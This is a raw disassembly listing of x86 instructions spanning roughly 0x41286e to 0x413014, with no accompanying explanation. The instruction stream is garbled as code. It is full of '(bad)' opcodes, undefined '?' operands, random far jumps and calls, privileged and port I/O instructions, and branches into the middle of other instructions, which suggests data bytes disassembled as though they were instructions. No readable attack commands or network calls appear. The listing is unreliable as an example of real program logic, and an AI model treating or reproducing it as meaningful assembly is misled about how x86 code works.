  41286e:	sub    eax,0xcd88e300
  412873:	aam    0x5b
  412875:	pop    edx
  412876:	je     0x412884
  412878:	lock and cl,ch
  41287b:	(bad)  
  41287c:	lds    eax,FWORD PTR [ecx+0x71b681f3]
  412882:	jno    0x4128c1
  412884:	fwait
  412885:	jmp    0x412874
  412887:	shl    DWORD PTR [edx+ebx*8+0x31b0ed30],cl
  41288e:	xchg   esi,eax
  41288f:	outs   dx,BYTE PTR ds:[esi]
  412890:	add    DWORD PTR [edx+0x77],ebx
  412893:	push   ecx
  412894:	imul   eax,DWORD PTR [ebp+0x61],0xbaaf5836
  41289b:	jnp    0x412889
  41289d:	arpl   si,cx
  41289f:	cli    
  4128a0:	mov    ecx,0x21a3bdfc
  4128a5:	xor    eax,0xa1aab52c
  4128aa:	(bad)  
  4128ab:	adc    al,0xda
  4128ad:	push   ds
  4128ae:	xor    eax,0xc52bf68d
  4128b3:	(bad)  
  4128b4:	jmp    0xec32:0xd924e00
  4128bb:	sub    dh,BYTE PTR [ebx+ecx*1+0x6856ab23]
  4128c2:	loope  0x41293b
  4128c4:	loop   0x4128a4
  4128c6:	adc    al,0x74
  4128c8:	das    
  4128c9:	ins    DWORD PTR es:[edi],dx
  4128ca:	mov    al,0x3c
  4128cc:	retf   
  4128cd:	xor    eax,0x11306574
  4128d2:	loop   0x412951
  4128d4:	inc    edx
  4128d5:	(bad)  
  4128d6:	pop    edi
  4128d7:	mov    es,WORD PTR [ecx+edx*1+0x10f58e1f]
  4128de:	cld    
  4128df:	jae    0x412911
  4128e1:	jmp    0x2024f478
  4128e6:	push   ebx
  4128e7:	stos   DWORD PTR es:[edi],eax
  4128e8:	outs   dx,BYTE PTR ds:[esi]
  4128e9:	test   BYTE PTR [ecx+0x42],ch
  4128ec:	daa    
  4128ed:	rol    bh,1
  4128ef:	mov    ecx,0x2958b59
  4128f4:	mov    ecx,0xe130364b
  4128f9:	mov    DWORD PTR [ebp+eax*1-0x3d6fe907],esi
  412900:	mov    WORD PTR [edx-0x35],gs
  412903:	pushf  
  412904:	mov    ?,esp
  412906:	lahf   
  412907:	adc    dl,BYTE PTR [eax-0x21406f4e]
  41290d:	in     al,dx
  41290e:	test   al,0x1e
  412910:	mov    dl,0xcb
  412912:	nop
  412913:	sti    
  412914:	push   ds
  412915:	inc    ecx
  412916:	xor    bh,BYTE PTR [esi-0x3e]
  412919:	mov    ds:0xd06e85a9,eax
  41291e:	(bad)  
  412920:	(bad)  
  412921:	jg     0x412922
  412923:	mov    bl,0xcf
  412925:	cmp    al,BYTE PTR [ebx]
  412927:	pusha  
  412928:	(bad)  
  412929:	pop    esp
  41292a:	mov    esi,0x4580407d
  41292f:	jnp    0x412959
  412931:	xlat   BYTE PTR ds:[ebx]
  412932:	test   eax,0x24e6e59e
  412937:	push   DWORD PTR [edi+0x4f]
  41293a:	inc    eax
  41293b:	pop    eax
  41293c:	outs   dx,DWORD PTR ds:[esi]
  41293d:	xor    eax,0x60f4de9b
  412942:	mov    bh,0xf1
  412944:	mov    ebx,0xa2e5d384
  412949:	dec    edx
  41294a:	and    BYTE PTR [ebp+0x7c916bc1],0x1a
  412951:	fwait
  412952:	inc    ebx
  412953:	push   ebx
  412954:	push   es
  412955:	or     al,0xa2
  412957:	push   ds
  412958:	cmp    ebx,ecx
  41295a:	xchg   ebx,eax
  41295b:	in     al,dx
  41295c:	outs   dx,BYTE PTR ds:[esi]
  41295d:	sub    dl,ah
  41295f:	push   ebp
  412960:	sub    DWORD PTR [ebx],ebp
  412962:	(bad)  
  412963:	gs mov ecx,0xef906d5a
  412969:	into   
  41296a:	(bad)  
  41296b:	jle    0x41295d
  41296d:	lods   al,BYTE PTR ds:[esi]
  41296e:	dec    ebp
  41296f:	ds popa 
  412971:	dec    edi
  412972:	out    dx,eax
  412973:	xchg   ebx,eax
  412974:	mov    ah,0x73
  412976:	popa   
  412977:	mov    cl,0x66
  412979:	hlt    
  41297a:	aas    
  41297b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41297c:	fst    DWORD PTR [ecx]
  41297e:	push   ebx
  41297f:	int3   
  412980:	mov    al,ds:0xd8c68060
  412985:	dec    ebp
  412986:	(bad)  
  412987:	jb     0x4129b7
  412989:	jb     0x4129a7
  41298b:	cli    
  41298c:	add    BYTE PTR [ecx],al
  41298e:	add    dl,BYTE PTR [edi-0x1de4a27b]
  412994:	jp     0x41292b
  412996:	fdiv   QWORD PTR [edx+0x1567a64]
  41299c:	sub    BYTE PTR [eax+0x5f],bl
  41299f:	test   BYTE PTR [ecx-0x37],0xd7
  4129a3:	cmp    eax,0xe7583c88
  4129a8:	(bad)  
  4129a9:	mov    eax,ds:0x5ddc43c4
  4129ae:	adc    al,0x19
  4129b0:	fucomp st(4)
  4129b2:	push   ebx
  4129b3:	mov    cl,0x2c
  4129b5:	cdq    
  4129b6:	jmp    0xd045cec4
  4129bb:	fwait
  4129bc:	and    al,0xb1
  4129be:	aam    0x64
  4129c0:	ror    DWORD PTR [esi+eiz*8-0xf],cl
  4129c4:	ror    esp,1
  4129c6:	fpatan 
  4129c8:	push   ebx
  4129c9:	cmp    DWORD PTR [ebx+0x4ec374b0],edi
  4129cf:	cmp    BYTE PTR [ecx+0x28],0xaa
  4129d3:	and    DWORD PTR [edi],edx
  4129d5:	(bad)  
  4129d6:	test   dh,0xb8
  4129d9:	push   ecx
  4129da:	stos   BYTE PTR es:[edi],al
  4129db:	inc    eax
  4129dc:	out    dx,al
  4129dd:	xchg   ecx,eax
  4129de:	into   
  4129df:	jb     0x4129d2
  4129e1:	fcmove st,st(1)
  4129e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129e4:	sbb    al,0xbd
  4129e6:	push   ss
  4129e7:	mov    ah,BYTE PTR [ebx]
  4129e9:	pop    ss
  4129ea:	stos   BYTE PTR es:[edi],al
  4129eb:	shl    DWORD PTR [edx],cl
  4129ed:	or     al,0x37
  4129ef:	jmp    0x1d8d:0x6963bc6a
  4129f6:	call   ebx
  4129f8:	push   eax
  4129f9:	jle    0x412a6b
  4129fb:	(bad)  
  4129fc:	xor    edi,DWORD PTR [edx]
  4129fe:	mov    esi,esp
  412a00:	(bad)  
  412a01:	aam    0x8e
  412a03:	sub    cl,bl
  412a05:	sar    BYTE PTR [ebx+ecx*8],cl
  412a08:	mov    ?,WORD PTR [eax+0x22b3d0f5]
  412a0e:	enter  0x67b,0x80
  412a12:	xor    ebp,DWORD PTR [edi+0x4b]
  412a15:	and    ebx,DWORD PTR [edx-0x38392747]
  412a1b:	push   ebp
  412a1c:	imul   edi,esi,0x20ac3bb0
  412a22:	shr    BYTE PTR [eax+0x5e],cl
  412a25:	sub    BYTE PTR [edi-0x77],0x35
  412a29:	sub    dl,BYTE PTR [edx]
  412a2b:	mov    ds:0x1363e85e,al
  412a30:	mov    BYTE PTR [ecx+0x479d6f07],bh
  412a36:	jno    0x412a0c
  412a38:	mov    ecx,0x446c39e9
  412a3d:	add    DWORD PTR [ebp+0x37],ebx
  412a40:	add    cl,BYTE PTR [edi-0x4c]
  412a43:	inc    BYTE PTR ds:0xedbd1ccc
  412a49:	inc    esi
  412a4a:	and    bl,bl
  412a4c:	nop
  412a4d:	pop    edx
  412a4e:	aad    0xc9
  412a50:	sbb    eax,0xa4ef6fb5
  412a55:	ret    
  412a56:	pop    ss
  412a57:	pop    ds
  412a58:	xor    dh,BYTE PTR [ecx+0x75]
  412a5b:	sub    al,0xe8
  412a5d:	xchg   BYTE PTR [ecx],bh
  412a5f:	pop    edi
  412a60:	bound  edx,QWORD PTR [esi+edx*8]
  412a63:	push   eax
  412a64:	mov    bl,0x6e
  412a66:	stos   BYTE PTR es:[edi],al
  412a67:	retf   
  412a68:	sahf   
  412a69:	push   ss
  412a6a:	into   
  412a6b:	pop    edi
  412a6c:	xor    DWORD PTR [ebx-0x4e],ebp
  412a6f:	out    dx,eax
  412a70:	test   eax,0xd76e288b
  412a75:	inc    ebp
  412a76:	jnp    0x412a3d
  412a78:	ins    BYTE PTR es:[edi],dx
  412a79:	ror    BYTE PTR [esi+0x74],0x9e
  412a7d:	mov    esp,DWORD PTR [esi-0x4896e8f6]
  412a83:	out    0x8b,al
  412a85:	dec    esp
  412a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a87:	test   esp,ecx
  412a89:	sub    al,0xd5
  412a8b:	pop    ebp
  412a8c:	add    eax,0xaf8d5277
  412a91:	shl    BYTE PTR [edi],0x56
  412a94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a95:	loopne 0x412afd
  412a97:	xchg   ax,ax
  412a99:	push   es
  412a9a:	inc    esi
  412a9b:	es adc bl,cl
  412a9e:	xor    DWORD PTR [edi-0x7c40bf80],edi
  412aa4:	js     0x412a3a
  412aa6:	adc    ebx,0xffffff94
  412aa9:	std    
  412aaa:	out    dx,al
  412aab:	in     al,0x13
  412aad:	and    eax,0xd00fd8ff
  412ab2:	dec    esp
  412ab3:	cmp    ebp,DWORD PTR [esi-0x2c]
  412ab6:	mov    ds:0xcb181a9,eax
  412abb:	sbb    al,0x23
  412abd:	loop   0x412b0d
  412abf:	stc    
  412ac0:	mov    ds,edx
  412ac2:	jmp    FWORD PTR [esi-0xd]
  412ac5:	mov    ds:0xfeedb502,eax
  412aca:	push   edx
  412acb:	ss ret 
  412acd:	push   ss
  412ace:	cmp    eax,0xa355e0f2
  412ad3:	lea    ecx,[esi]
  412ad5:	add    al,0xf8
  412ad7:	xor    al,0x49
  412ad9:	pop    eax
  412ada:	das    
  412adb:	sub    eax,0x9441f19b
  412ae0:	out    dx,al
  412ae1:	in     eax,0x8b
  412ae3:	rol    BYTE PTR [edi],0x1b
  412ae6:	data16 (bad) 
  412ae8:	call   0x41d85e82
  412aed:	mov    eax,ds:0x70ff89b1
  412af2:	xor    dl,BYTE PTR [esp+eax*8]
  412af5:	retf   0xd125
  412af8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412af9:	iret   
  412afa:	mov    ds:0x40e561cd,al
  412aff:	adc    al,0x7b
  412b01:	mov    esp,0xb38e53e1
  412b06:	cmpxchg eax,ebp
  412b09:	(bad)  
  412b0a:	dec    edi
  412b0b:	inc    esp
  412b0c:	adc    al,0xa0
  412b0e:	cli    
  412b0f:	push   ecx
  412b10:	jns    0x412b6a
  412b12:	sbb    BYTE PTR [edx],dh
  412b14:	jg     0x412b4c
  412b16:	mov    al,ds:0xacd045e
  412b1b:	(bad)  
  412b1c:	pop    ebx
  412b1d:	sub    al,0xb
  412b1f:	iret   
  412b20:	lahf   
  412b21:	jl     0x412b46
  412b23:	popf   
  412b24:	xor    edi,DWORD PTR [edi-0x4a0c2428]
  412b2a:	sbb    DWORD PTR [esi+0x2d],esp
  412b2d:	sub    DWORD PTR [eax+0x473ca041],esi
  412b33:	push   ds
  412b34:	pop    ds
  412b35:	mov    edi,0x92ef63d
  412b3a:	xchg   DWORD PTR [ecx+0x6b056ff4],ecx
  412b40:	cmp    BYTE PTR [esi+0x74e552de],cl
  412b46:	mov    ch,0x44
  412b48:	sahf   
  412b49:	mov    ecx,0xdf420456
  412b4e:	and    esi,DWORD PTR [ecx+0x305cee52]
  412b54:	dec    ebp
  412b55:	or     eax,0x51ce99b3
  412b5a:	push   edi
  412b5b:	(bad)  
  412b5c:	lea    ebp,[ecx+0x61d6b9d2]
  412b62:	ja     0x412b10
  412b64:	push   ecx
  412b65:	dec    eax
  412b66:	(bad)  
  412b67:	pop    ebx
  412b68:	(bad)  
  412b69:	retf   
  412b6a:	cmp    DWORD PTR [edx-0x6e90e972],eax
  412b70:	sti    
  412b71:	push   0xee5037e2
  412b76:	popf   
  412b77:	xchg   esp,eax
  412b78:	mov    dl,0x3a
  412b7a:	inc    ebp
  412b7b:	mov    dh,0xa0
  412b7d:	es mov esi,0xca5e9b88
  412b83:	test   dh,dl
  412b85:	addr16 jmp 0x53496c5d
  412b8b:	popa   
  412b8c:	adc    al,0xf7
  412b8e:	add    DWORD PTR [edi-0x17897b60],esp
  412b94:	lods   eax,DWORD PTR ds:[esi]
  412b95:	cmp    DWORD PTR [eax],esi
  412b97:	int3   
  412b98:	and    esp,DWORD PTR [edi+0x4b]
  412b9b:	jmp    0x412be8
  412b9d:	or     ch,BYTE PTR ds:0x41a1b00
  412ba3:	hlt    
  412ba4:	dec    eax
  412ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba6:	(bad)  
  412ba7:	int3   
  412ba8:	repnz imul edi,ecx,0x1464217
  412baf:	inc    ecx
  412bb0:	aad    0x94
  412bb2:	in     eax,dx
  412bb3:	inc    edi
  412bb4:	and    BYTE PTR [ebx+0x3e69faba],0xd
  412bbb:	sbb    BYTE PTR [ebx],bl
  412bbd:	mov    ebp,0x2ade0244
  412bc2:	pushf  
  412bc3:	(bad)  
  412bc5:	(bad)  
  412bc6:	jnp    0x412bbc
  412bc8:	mov    eax,es:0xde10eb14
  412bce:	xchg   ebp,eax
  412bcf:	call   0xbb3f0012
  412bd4:	push   esp
  412bd5:	xchg   esp,eax
  412bd6:	sub    al,0x8f
  412bd8:	(bad)  
  412bd9:	or     al,0x7c
  412bdb:	cmc    
  412bdc:	push   ebp
  412bdd:	daa    
  412bde:	ror    BYTE PTR [edi+0x14],0x5
  412be2:	call   0x8f00:0x905a10f7
  412be9:	sahf   
  412bea:	mov    bl,0x9c
  412bec:	push   0xffffffda
  412bee:	mov    fs,WORD PTR [ecx+0x41]
  412bf1:	enter  0x1b1d,0xef
  412bf5:	es sbb cl,dl
  412bf8:	ss and edi,ebx
  412bfb:	retf   
  412bfc:	pop    edi
  412bfd:	adc    dh,BYTE PTR [eax-0x5e4a9680]
  412c03:	sbb    dl,0x6
  412c06:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  412c08:	aad    0x84
  412c0a:	inc    ebx
  412c0b:	sbb    eax,0xab4882a6
  412c10:	pop    eax
  412c11:	fadd   DWORD PTR [ecx-0x47]
  412c14:	cmp    al,0x2c
  412c16:	mov    dl,0xc5
  412c18:	scas   eax,DWORD PTR es:[edi]
  412c19:	dec    ecx
  412c1a:	in     eax,dx
  412c1b:	sub    eax,ecx
  412c1d:	push   0x37d25502
  412c22:	jbe    0x412c89
  412c24:	into   
  412c25:	dec    edi
  412c26:	and    BYTE PTR [ebx],dh
  412c28:	jge    0x412bf1
  412c2a:	mov    dh,0x57
  412c2c:	aaa    
  412c2d:	retf   
  412c2e:	ja     0x412c38
  412c30:	push   es
  412c31:	das    
  412c32:	and    al,0x5f
  412c34:	dec    BYTE PTR [edx-0x4cb02b20]
  412c3a:	lods   eax,DWORD PTR ds:[esi]
  412c3b:	fnstenv [ebp-0x34]
  412c3e:	mov    eax,0x7d529de
  412c43:	mul    DWORD PTR [eax+ebp*4+0x5f]
  412c47:	pusha  
  412c48:	ins    DWORD PTR es:[edi],dx
  412c49:	xor    BYTE PTR [eax-0x4417d2dc],0xa9
  412c50:	popa   
  412c51:	test   eax,0x83accce5
  412c56:	push   edi
  412c57:	lahf   
  412c58:	dec    esi
  412c59:	jo     0x412c4f
  412c5b:	and    edi,DWORD PTR [edx+0x13]
  412c5e:	loope  0x412c8b
  412c60:	hlt    
  412c61:	dec    edi
  412c62:	std    
  412c63:	dec    edx
  412c64:	sti    
  412c65:	sbb    eax,0x98d0a1da
  412c6a:	(bad)  
  412c6b:	push   esi
  412c6c:	popa   
  412c6d:	sbb    ch,BYTE PTR [ecx]
  412c6f:	and    edi,edi
  412c71:	xor    ch,BYTE PTR [esi+0x38]
  412c74:	call   0x5deab5f4
  412c79:	sar    bh,0xc2
  412c7c:	jl     0x412c9d
  412c7e:	aam    0xbb
  412c80:	xchg   esp,eax
  412c81:	pushf  
  412c82:	lahf   
  412c83:	mov    cl,bl
  412c85:	(bad)  
  412c87:	mov    eax,ds:0x5372f2a
  412c8c:	mov    edx,DWORD PTR ds:0xedf8f18e
  412c92:	push   ecx
  412c93:	dec    edx
  412c94:	or     ecx,DWORD PTR [ebx-0x21]
  412c97:	fisub  DWORD PTR [ebx+0x32ddbf00]
  412c9d:	mov    cl,BYTE PTR [esi+0x1f77900a]
  412ca3:	xor    al,0x22
  412ca5:	and    eax,0x38fe5719
  412caa:	xor    al,0xb
  412cac:	repz jo 0x412c48
  412caf:	or     ecx,DWORD PTR [ebx-0x6357e313]
  412cb5:	push   esi
  412cb6:	clc    
  412cb7:	jg     0x412cad
  412cb9:	pop    edi
  412cba:	jecxz  0x412c79
  412cbc:	xor    BYTE PTR [esi+0x5f],dh
  412cbf:	test   al,0x2
  412cc1:	push   0xffffff95
  412cc3:	inc    edx
  412cc4:	stc    
  412cc5:	mov    ah,0xe5
  412cc7:	xchg   bx,ax
  412cc9:	addr16 jno 0x412cf2
  412ccc:	add    BYTE PTR [ebx],0x15
  412ccf:	xchg   edx,eax
  412cd0:	xlat   BYTE PTR ds:[ebx]
  412cd1:	cmp    al,0xcb
  412cd3:	jmp    0xe1410e40
  412cd8:	pop    ebp
  412cd9:	cmp    DWORD PTR [ecx+0x55502e04],ebx
  412cdf:	dec    edi
  412ce0:	or     eax,ecx
  412ce2:	je     0x412cbe
  412ce4:	pop    edi
  412ce5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce6:	push   es
  412ce7:	push   0x8b8b07ba
  412cec:	fistp  QWORD PTR [edx+0x0]
  412cef:	jg     0x412c7f
  412cf1:	inc    edi
  412cf2:	jnp    0x412ccd
  412cf4:	cmp    eax,0xb39da1b4
  412cf9:	bound  ebx,QWORD PTR [ebx+0x56]
  412cfc:	ds jmp 0x282c:0x893ec037
  412d04:	dec    ebp
  412d05:	adc    ah,BYTE PTR [ebx]
  412d07:	sbb    eax,0xd9668123
  412d0c:	sbb    eax,0x2d97416a
  412d11:	jnp    0x412d39
  412d13:	repz cmp eax,0xd677f786
  412d19:	mov    ebx,0x6f36dbe3
  412d1e:	call   DWORD PTR [ebx-0x393f72a7]
  412d24:	jp     0x412ce0
  412d26:	pop    esp
  412d27:	sbb    ah,BYTE PTR [ecx]
  412d29:	xor    cl,ah
  412d2b:	xlat   BYTE PTR ds:[ebx]
  412d2c:	aad    0xcd
  412d2e:	jmp    0xfaef:0xbdabeff4
  412d35:	jge    0x412d16
  412d37:	push   edi
  412d38:	xchg   DWORD PTR [edx],esi
  412d3a:	or     al,0x92
  412d3c:	push   esp
  412d3d:	push   es
  412d3e:	pop    esp
  412d3f:	in     al,0xa7
  412d41:	mov    eax,ds:0x24e30510
  412d46:	xchg   ebx,eax
  412d47:	pop    es
  412d48:	add    ch,BYTE PTR [edi-0x285fa01a]
  412d4e:	test   DWORD PTR [eax],0xf3823934
  412d54:	pop    ebp
  412d55:	pop    eax
  412d56:	pop    edx
  412d57:	in     al,dx
  412d58:	fcomp  QWORD PTR [ebp+0x483450b2]
  412d5e:	sti    
  412d5f:	arpl   WORD PTR [ebp+0x238c2d88],sp
  412d65:	pushf  
  412d66:	and    al,ch
  412d68:	cmp    al,0x7
  412d6a:	fst    QWORD PTR [ebx-0x68]
  412d6d:	retf   0x4ad6
  412d70:	add    ah,BYTE PTR fs:[edi]
  412d73:	fild   QWORD PTR [eax-0x4921035c]
  412d79:	push   0x59
  412d7b:	pop    esp
  412d7c:	leave  
  412d7d:	push   es
  412d7e:	loopne 0x412d69
  412d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d81:	sbb    DWORD PTR [esi],0x8e5ad699
  412d87:	aad    0x8a
  412d89:	dec    esp
  412d8a:	mov    ds:0x891232a8,al
  412d8f:	sar    edx,1
  412d91:	push   es
  412d92:	stos   BYTE PTR es:[edi],al
  412d93:	add    ch,BYTE PTR [eax+0x14ea4ef2]
  412d99:	pop    ss
  412d9a:	retf   
  412d9b:	frstor [ecx]
  412d9d:	mov    ch,0x2c
  412d9f:	jne    0x412dc9
  412da1:	mov    cl,0x6e
  412da3:	adc    BYTE PTR [edx+0x793ecbf6],al
  412da9:	dec    ebp
  412daa:	stos   DWORD PTR es:[edi],eax
  412dab:	shl    BYTE PTR [eax],cl
  412dad:	(bad)  
  412dae:	jmp    0x757e4baa
  412db3:	lahf   
  412db4:	outs   dx,DWORD PTR ds:[esi]
  412db5:	in     eax,0x86
  412db7:	repz pop ss
  412db9:	xor    edx,DWORD PTR [edi+ebp*2-0x3db89784]
  412dc0:	outs   dx,DWORD PTR ds:[esi]
  412dc1:	ret    
  412dc2:	test   BYTE PTR [ecx+0x38],cl
  412dc5:	test   BYTE PTR ds:0x18b30be8,bl
  412dcb:	and    al,0x6a
  412dcd:	or     cl,BYTE PTR ds:0x9ca3c961
  412dd3:	fwait
  412dd4:	gs xor bl,ah
  412dd7:	mov    dl,0x4
  412dd9:	and    DWORD PTR [esi+edi*1+0x428d2dd8],eax
  412de0:	outs   dx,DWORD PTR ds:[esi]
  412de1:	int3   
  412de2:	das    
  412de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412de4:	xchg   ebp,eax
  412de5:	out    dx,al
  412de6:	pop    edi
  412de7:	adc    eax,0x6d5c6da7
  412dec:	test   eax,ecx
  412dee:	or     al,0x78
  412df0:	pop    esi
  412df1:	push   ss
  412df2:	into   
  412df3:	jne    0x412db8
  412df5:	aad    0x6d
  412df7:	lahf   
  412df8:	bound  esp,QWORD PTR [edi+0x6f]
  412dfb:	in     al,0x3b
  412dfd:	jae    0x412ddb
  412dff:	stc    
  412e00:	fcom   QWORD PTR [ebp-0x5262d303]
  412e06:	mov    edi,0x6b74b060
  412e0b:	mov    WORD PTR [ebp-0x54],es
  412e0e:	xor    BYTE PTR [ebx],bh
  412e10:	mov    WORD PTR [ecx-0x2c],?
  412e13:	js     0x412e23
  412e15:	or     al,0xb2
  412e17:	or     dl,BYTE PTR [ecx-0x58]
  412e1a:	bound  esi,QWORD PTR [ebx+0x631bf563]
  412e20:	imul   esp,DWORD PTR [esp-0x4],0x30
  412e25:	jp     0x412e63
  412e27:	(bad)  
  412e28:	pop    ebx
  412e29:	cwde   
  412e2a:	xor    BYTE PTR [eax],bl
  412e2c:	sbb    bh,dh
  412e2e:	bound  ebx,QWORD PTR [edx+0x2a]
  412e31:	cmp    al,0xaa
  412e33:	(bad)
  412e37:	mov    DWORD PTR [eax+esi*8-0x15],0xfa6620d8
  412e3f:	dec    eax
  412e40:	aaa    
  412e41:	jno    0x412dee
  412e43:	cmp    eax,0xcfc4cfa4
  412e48:	inc    ebp
  412e49:	sbb    BYTE PTR [edx-0x53],ch
  412e4c:	jne    0x412e50
  412e4e:	jge    0x412e1c
  412e50:	cwde   
  412e51:	bound  ecx,QWORD PTR [ecx+0x521bb4a6]
  412e57:	bound  edx,QWORD PTR [eax]
  412e59:	(bad)  [esp+edi*1+0x70310b1a]
  412e60:	pop    ds
  412e61:	jmp    0x85b1:0x5bdd7879
  412e68:	jl     0x412ebc
  412e6a:	push   esi
  412e6b:	cmp    BYTE PTR [edi],cl
  412e6d:	(bad)  
  412e6f:	into   
  412e70:	jg     0x412e61
  412e72:	ret    
  412e73:	or     BYTE PTR [ecx-0x41],dl
  412e76:	rcl    BYTE PTR ds:0xd7a47be9,0x5d
  412e7d:	jmp    0x412e10
  412e7f:	in     eax,dx
  412e80:	jmp    0xe29ceac5
  412e85:	imul   esp,DWORD PTR [esi+0x360e40f7],0x4
  412e8c:	xchg   ebx,eax
  412e8d:	inc    edx
  412e8e:	add    BYTE PTR [esi+0x6a],dh
  412e91:	ja     0x412ee0
  412e93:	jg     0x412e73
  412e95:	sub    ch,bl
  412e97:	xchg   edx,eax
  412e98:	jmp    0x412e9c
  412e9a:	jmp    0x1eb4528b
  412e9f:	lods   eax,DWORD PTR ds:[esi]
  412ea0:	mov    bh,dl
  412ea2:	xchg   DWORD PTR [ebx-0x2f7aff9e],ebp
  412ea8:	mov    es,WORD PTR [eax-0x77]
  412eab:	jmp    0x412e7f
  412ead:	mov    dl,BYTE PTR [eax+ebx*2]
  412eb0:	push   edi
  412eb1:	or     al,0x1a
  412eb3:	out    dx,al
  412eb4:	jl     0x412ee2
  412eb6:	mov    eax,0x22ca2d7c
  412ebb:	pop    es
  412ebc:	inc    esp
  412ebd:	sbb    al,0x51
  412ebf:	push   ebp
  412ec0:	xor    edi,DWORD PTR [esi+edx*8-0x6b627b1]
  412ec7:	jbe    0x412ed7
  412ec9:	in     eax,0x3e
  412ecb:	and    esi,DWORD PTR [edx]
  412ecd:	retf   0x9c26
  412ed0:	xlat   BYTE PTR ds:[ebx]
  412ed1:	push   edx
  412ed2:	out    dx,al
  412ed3:	jno    0x412ee6
  412ed5:	mov    ebx,0x85143204
  412eda:	and    DWORD PTR [ebx-0x13],eax
  412edd:	js     0x412f57
  412edf:	sub    esi,DWORD PTR [ebx-0x54]
  412ee2:	test   DWORD PTR [eax+0x54b840b8],edx
  412ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ee9:	icebp  
  412eea:	(bad)  
  412eeb:	jmp    0x412f1f
  412eed:	ret    0xb53
  412ef0:	rcl    BYTE PTR [ebp+0x72],cl
  412ef3:	outs   dx,BYTE PTR ds:[esi]
  412ef4:	dec    dh
  412ef6:	jae    0x412f3e
  412ef8:	scas   eax,DWORD PTR es:[edi]
  412ef9:	out    0xc5,al
  412efb:	(bad)  
  412efc:	pushf  
  412efd:	lea    eax,[edx]
  412eff:	ror    BYTE PTR [edx-0x65],0x5e
  412f03:	xchg   dh,dh
  412f05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f06:	lds    esp,FWORD PTR [edx+edi*8]
  412f09:	jmp    0x412f56
  412f0b:	mov    BYTE PTR [ecx+0x680c3bed],bh
  412f11:	jne    0x412f2a
  412f13:	mov    dl,0xeb
  412f15:	lds    ecx,FWORD PTR [esi+0x69]
  412f18:	sti    
  412f19:	mov    dh,0xc0
  412f1b:	test   eax,0xff70cfa3
  412f20:	(bad)  
  412f21:	pop    edx
  412f22:	add    eax,0xb8646bd5
  412f27:	pop    es
  412f28:	mov    dh,BYTE PTR [eax+0x60]
  412f2b:	add    DWORD PTR [ebx-0x79373b8d],0xffffffdf
  412f32:	xchg   ecx,eax
  412f33:	fidiv  WORD PTR [ebx-0x593d8d3f]
  412f39:	jmp    0x98e50f78
  412f3e:	xchg   edi,eax
  412f3f:	out    dx,eax
  412f40:	ins    DWORD PTR es:[edi],dx
  412f41:	mov    ds:0xe391beb1,eax
  412f46:	dec    ecx
  412f47:	stos   BYTE PTR es:[edi],al
  412f48:	fwait
  412f49:	stos   BYTE PTR es:[edi],al
  412f4a:	in     al,dx
  412f4b:	ret    0x89af
  412f4e:	mov    fs,esp
  412f50:	addr16 aad 0xe4
  412f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f54:	loopne 0x412f5f
  412f56:	ss cmp eax,0xecc6692
  412f5c:	mov    ecx,DWORD PTR [ebp-0x25f5b5b6]
  412f62:	cmp    edi,edi
  412f64:	pop    ds
  412f65:	popa   
  412f66:	dec    ecx
  412f67:	call   0x5136:0xc32ca901
  412f6e:	lods   al,BYTE PTR ds:[esi]
  412f6f:	sub    DWORD PTR [eax+0x16],ebx
  412f72:	inc    DWORD PTR [esi+0x75]
  412f75:	and    al,0x38
  412f77:	lock lahf 
  412f79:	adc    edi,DWORD PTR [eax-0x45362c45]
  412f7f:	push   edi
  412f80:	ins    DWORD PTR es:[edi],dx
  412f81:	pop    ebp
  412f82:	aaa    
  412f83:	out    dx,eax
  412f84:	add    BYTE PTR [ebx+0x70f518a6],0x53
  412f8b:	das    
  412f8c:	imul   edx,DWORD PTR [ebp+0x39],0x7
  412f90:	leave  
  412f91:	add    esp,DWORD PTR [ebp+0x181ff279]
  412f97:	stos   BYTE PTR es:[edi],al
  412f98:	mov    bh,0x36
  412f9a:	lock inc ebx
  412f9c:	inc    edx
  412f9e:	jp     0x412ff6
  412fa0:	stc    
  412fa1:	mov    ah,0xee
  412fa3:	xor    BYTE PTR [eax],bl
  412fa5:	cmp    eax,0x1370dcba
  412faa:	pop    eax
  412fab:	adc    ebp,DWORD PTR [ebp+0x4c5a6e19]
  412fb1:	jmp    0x3b2c:0xcf03d84d
  412fb8:	sbb    esi,DWORD PTR gs:[edi-0x10]
  412fbc:	lods   eax,DWORD PTR ds:[esi]
  412fbd:	pop    ss
  412fbe:	in     al,0x9e
  412fc0:	xchg   ebx,eax
  412fc1:	lds    ecx,FWORD PTR [esi]
  412fc3:	sub    ebp,edi
  412fc5:	js     0x412fc3
  412fc7:	jae    0x412f82
  412fc9:	xor    dl,ch
  412fcb:	mov    ecx,eax
  412fcd:	dec    esp
  412fce:	test   eax,0xb1d2a796
  412fd3:	daa    
  412fd4:	stc    
  412fd5:	xor    bh,BYTE PTR [ebx]
  412fd7:	push   DWORD PTR [ebx]
  412fd9:	fst    QWORD PTR [ebx]
  412fdb:	out    dx,al
  412fdc:	jmp    0xdf4:0xae40e70e
  412fe3:	mov    eax,0x5098a4b0
  412fe8:	mov    eax,ds:0xb5169d04
  412fed:	cmp    al,0x9c
  412fef:	pop    ebp
  412ff0:	xchg   DWORD PTR [eax-0x15467ca],ecx
  412ff6:	dec    edi
  412ff7:	icebp  
  412ff8:	ret    
  412ff9:	xchg   ebp,eax
  412ffa:	pop    eax
  412ffb:	call   0xee3a3ffd
  413000:	sar    al,cl
  413002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413003:	adc    DWORD PTR [ebx],esp
  413005:	mov    edx,0x14eb9bc5
  41300a:	add    ebx,DWORD PTR [esi-0x6456a9b6]
  413010:	sub    bh,BYTE PTR [eax+0x52]
  413013:	scas   al,BYTE PTR es:[edi]
  413014:	jg     0x413013
